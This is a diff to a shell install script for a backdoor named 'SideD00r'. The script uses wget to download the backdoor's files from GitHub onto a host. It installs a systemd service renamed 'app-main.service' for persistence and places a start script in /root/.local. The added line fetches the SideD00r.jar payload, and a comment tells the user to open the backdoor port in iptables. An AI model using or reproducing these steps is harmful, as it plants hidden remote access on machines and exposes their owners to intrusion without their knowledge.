@@ -4,6 +4,7 @@ apt-get install screen default-jre -y;
 # download persistence files and sided00r.
 wget https://raw.githubusercontent.com/Aaron-Akhtar/SideD00r/main/sided00r.service -O /etc/systemd/system/app-main.service 
 wget https://raw.githubusercontent.com/Aaron-Akhtar/SideD00r/main/start.sh -O /root/.local/start.sh
+wget https://github.com/Aaron-Akhtar/SideD00r/releases/download/1.0.1.1/SideD00r.jar -O /root/.local/SideD00r.jar
 
 # SET PORT IN IPTABLES FILE TO THE SIDED00R PORT (900 by default).
 wget https://raw.githubusercontent.com/Aaron-Akhtar/SideD00r/main/iptables.sh -O /root/.local/iptables.sh
